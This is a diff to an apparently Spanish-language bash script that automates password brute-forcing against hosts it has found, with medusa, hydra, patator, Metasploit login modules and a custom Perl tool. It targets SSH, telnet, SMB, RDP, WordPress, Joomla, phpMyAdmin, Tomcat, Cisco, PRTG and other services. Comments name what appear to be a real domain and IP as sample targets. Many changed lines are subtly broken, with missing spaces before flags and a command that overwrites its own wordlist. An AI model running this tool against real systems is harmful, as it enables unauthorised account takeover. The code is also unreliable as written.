@@ -82,18 +82,16 @@ fi
 if [ $DICTIONARY = NULL ] ; then
 
 	echo $ENTIDAD > base.txt
-	passGen.sh -f base.txt -t top200 -o top.txt 
+	passGen.sh -f base.txt -t top500 -l $LANGUAGE -o passwords.txt
 	rm base.txt
-	echo "wordpress" >> top.txt	
-	echo "joomla" >> top.txt	
-	echo "drupal" >> top.txt	
+	echo "wordpress" >> passwords.txt	
+	echo "joomla" >> passwords.txt	
+	echo "drupal" >> passwords.txt	
 else
-	cp $DICTIONARY top.txt	
+	cp $DICTIONARY passwords.txt	
 	
 	#/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
 fi
-echo '!love29jan2006!' >> top.txt
-
 
 function insert_data () {
 	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
@@ -110,8 +108,8 @@ function insert_data () {
 if [ -f servicios/ssh_onlyhost.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios de SSH expuestos en  $RESET"	  
-	#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
-	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &
+	#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt-h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
+	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P passwords.txt-h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &
 	insert_data
 		
 fi
@@ -124,19 +122,19 @@ if [ -f servicios/Windows.txt ]
 then
 	echo -e "\n\t $OKBLUE Testing windows auth  $RESET"	  	
 	
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n hydra -l $admin_user -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $admin_user -P top.txt -t 1 _target_  smb >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n hydra -l $admin_user -P passwords.txt-t 1 _target_  smb' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $admin_user -P passwords.txt-t 1 _target_  smb >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
 
 	if [ "$LANGUAGE" == "es" ]; then
-		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-		interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P passwords.txt-t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+		interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P passwords.txt-t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
 		
-		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l sistemas -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-		interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l sistemas -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l sistemas -P passwords.txt-t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+		interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l sistemas -P passwords.txt-t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
 	fi
 		
-	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent		
+	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l $ENTIDAD -P passwords.txt-t 1 _target_  smb' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $ENTIDAD -P passwords.txt-t 1 _target_  smb >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent		
 			
 fi
 
@@ -155,8 +153,8 @@ fi
 ### telnet #########
 if [ -f servicios/telnet_onlyhost.txt ]
 then
-	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M telnet' >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
-	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M telnet >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
+	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt-h _target_ -M telnet' >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
+	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "medusa -e n -u root -P passwords.txt-h _target_ -M telnet >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
 fi
 
 			
@@ -178,7 +176,7 @@ if [ -f servicios/rdp.txt ]; then
 		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
 		
 		####### user administrador ####
-		patator.py rdp_login host=$ip user=$admin_user password=FILE0 0=top.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED' 2> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
+		patator.py rdp_login host=$ip user=$admin_user password=FILE0 0=passwords.txt-x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED' 2> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 		egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK|ERRCONNECT_CONNECT_CANCELLED" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then	
@@ -191,7 +189,7 @@ if [ -f servicios/rdp.txt ]; then
 		if [ -z "$ENTIDAD" ]
 		then
 			####### user $ENTIDAD ####
-			patator.py rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -x quit:egrep='OK|PASSWORD_EXPIRED' 2>> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
+			patator.py rdp_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt-x quit:egrep='OK|PASSWORD_EXPIRED' 2>> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 			egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then	
@@ -217,6 +215,8 @@ then
 		
 	for line in $(cat servicios/admin-web.txt); do	
 		
+		echo -e "\n\t########### $line #######"				
+
 		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo:443/wp-login.php
 		url=`echo $ip_port_path | sed 's/wp-login.php//'` # https://www.sanmateo.com.bo:443
 		fingerprint=`echo $line | cut -d ";" -f 2`
@@ -229,13 +229,10 @@ then
 		path=`echo $path | sed 's/wp-login.php//'` #borrar wp-login.php y dejar path como / o /web/
 
 		
-		echo -e "\n\t########### $ip_port #######"				
-		echo ""
+		
+		echo "ip_port_path $ip_port_path "
 		if [[ $fingerprint = *"wordpress"* ]]; then
-			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip:$port $RESET"				
-			echo -e "\n\t########### extract passwords from $proto_ip_port #######"
-			cewl -w cewl-passwords.txt -e -a $proto_ip_port
-			cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt			
+			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip:$port $RESET"						
 			echo -e "\t[+] Probando contraseñas comunes ...."
 			if [ -f ".vulnerabilidades2/"$ip"_"$port"_wpUsers.txt" ]; then
 				#https://181.115.188.36:443/				
@@ -244,11 +241,11 @@ then
 					#Dominio
 					if [[ "$ip" == *"bo" || "$ip" == *"com"  || "$ip" == *"net" || "$ip" == *"org" || "$ip" == *"net" ]];then 
 						real_ip=`host $ip | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					fi			
 				done
 			else
@@ -256,11 +253,11 @@ then
 				#$ip = dominio
 					if [[ "$ip" == *"bo" || "$ip" == *"com"  || "$ip" == *"net" || "$ip" == *"org" || "$ip" == *"net" ]];then 
 						real_ip=`host $ip | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE passwords.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					fi										
 			fi						
 			grep --color=never -i 'SUCCESS' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 									
@@ -268,30 +265,30 @@ then
 		
 		if [[ $fingerprint = *"phpmyadmin"* ]]; then
 			echo -e "\t[+] phpMyAdmin identificado"
-			echo "passWeb.pl -t $ip -p $port -m phpmyadmin -d \"/$path/\" -u root|admin|wordpress|joomla|drupal|phpmyadmin -f top.txt" > logs/cracking/"$ip"_"$port"_passwordBD.txt 
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u root -f top-web.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u admin -f top-web.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &			
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u phpmyadmin -f top-web.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+			echo "passWeb.pl -t $ip -p $port -m phpmyadmin -d \"/$path/\" -u root|admin|wordpress|joomla|drupal|phpmyadmin -f passwords.txt" > logs/cracking/"$ip"_"$port"_passwordBD.txt 
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u root -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u admin -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &			
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u phpmyadmin -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
 
 			#######  wordpress ######
 			grep -qi wordpress .enumeracion2/"$ip"_"$port"_webData.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]];then 
-				passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u wordpress -f top-web.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u wordpress -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
 			fi
 
 			#######  joomla ######
 			grep -qi joomla .enumeracion2/"$ip"_"$port"_webData.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]];then 
-				passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u joomla -f top-web.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u joomla -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
 			fi
 
 			#######  drupal ######
 			grep -qi drupal .enumeracion2/"$ip"_"$port"_webData.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]];then 
-				passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u drupal -f top-web.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt&
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u drupal -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt&
 			fi
 
 					
@@ -320,10 +317,10 @@ then
 			echo -e "\t[+] Joomla identificado"
 			echo -e "\t[+] Probando contraseñas comunes ...."
 			cewl -w cewl-passwords.txt -e -a $proto_ip_port
-			cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt
+			cat passwords.txtcewl-passwords.txt | sort | uniq > passwords.txt
 			echo "admin" > username.txt
-			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top-web.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$ip"_"$port"_joomla.txt
-			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top-web.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$ip"_"$port"_joomla.txt 2>/dev/null
+			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$ip"_"$port"_joomla.txt
+			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$ip"_"$port"_joomla.txt 2>/dev/null
 			grep --color=never 'Successful login' logs/cracking/"$ip"_"$port"_joomla.txt | sort | uniq > .vulnerabilidades/"$ip"_"$port"_joomla.txt 
 			rm username.txt
 					
@@ -344,8 +341,8 @@ then
 				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$ip"_tomcat_passwordDefecto.txt
 			else
 				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
-				#echo "patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 				
-				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=3 > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt			
+				#echo "patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt-e user_pass:b64 --threads=3" >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 				
+				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt-e user_pass:b64 --threads=3 > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt			
 				egrep -iq "INFO - 200" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then			
@@ -359,7 +356,7 @@ then
 			
 											
 			
-			#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat2.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat2.txt
+			#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat2.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat2.txt
 			#si encontro el password
 #				egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat2.txt
 			#greprc=$?
@@ -370,7 +367,7 @@ then
 				#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
 			#fi
 			
-			#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=top-web.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat3.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat3.txt
+			#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat3.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat3.txt
 			#si encontro el password
 			#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat3.txt
 			#greprc=$?
@@ -390,15 +387,15 @@ then
 	
 	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
 	  		  
-	sed -i '1 i\cisco' top.txt	#adicionar password cisco
+	sed -i '1 i\cisco' passwords.txt	#adicionar password cisco
 	echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
 	for ip in $(cat servicios/cisco401.txt); do			
 		egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "[+] Probando $ip"
-			echo "patator.py http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
-			patator.py http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
+			echo "patator.py http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=passwords.txt-e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
+			patator.py http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=passwords.txt-e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinadoServ.txt`
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then
@@ -416,13 +413,13 @@ if [ -f servicios/PRTG.txt ]
 then 
 	  	
 	echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
-	sed -i '1 i\prtgadmin' top.txt	#adicionar password prtgadmin
+	sed -i '1 i\prtgadmin' passwords.txt	#adicionar password prtgadmin
 	for line in $(cat servicios/PRTG.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`								
 		echo -e "[+] Probando $ip:$port"
-		echo "passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f top.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
-		passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f top.txt >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
+		echo "passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
+		passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
 		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
 		echo ""			
 	done
@@ -441,7 +438,7 @@ then
 		port=`echo $line | cut -f2 -d":"`
 					
 		echo -e "[+] Probando $ip"
-		passWeb.pl -t $ip -p $port -d / -m pentaho -u admin -f top.txt  > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
+		passWeb.pl -t $ip -p $port -d / -m pentaho -u admin -f passwords.txt > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
 		sleep 2
 		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
 		
@@ -465,7 +462,7 @@ then
 			port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
 			
 			#probar con usuario admin
-			patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+			patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=passwords.txt-e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then
@@ -473,7 +470,7 @@ then
 			fi	
 			
 			#probar con usuario root
-			patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
+			patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=passwords.txt-e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then
@@ -486,7 +483,7 @@ then
 			port=`echo $line | cut -f2 -d":"`
 			if [[ ${port} == *"443"*  ]];then 	
 				#probar con usuario admin
-				patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
+				patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=passwords.txt-e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
 				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
@@ -494,7 +491,7 @@ then
 				fi	
 			
 				#probar con usuario root
-				patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
+				patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=passwords.txt-e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
 				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then
@@ -518,8 +515,8 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Probando $ip"		
-		echo -e "passWeb.pl -t $ip -p $port -m ZKSoftware -u administrator -f top.txt " > logs/cracking/"$ip"_80_passwordZKSoftware.txt
-		passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt >> logs/cracking/"$ip"_80_passwordZKSoftware.txt
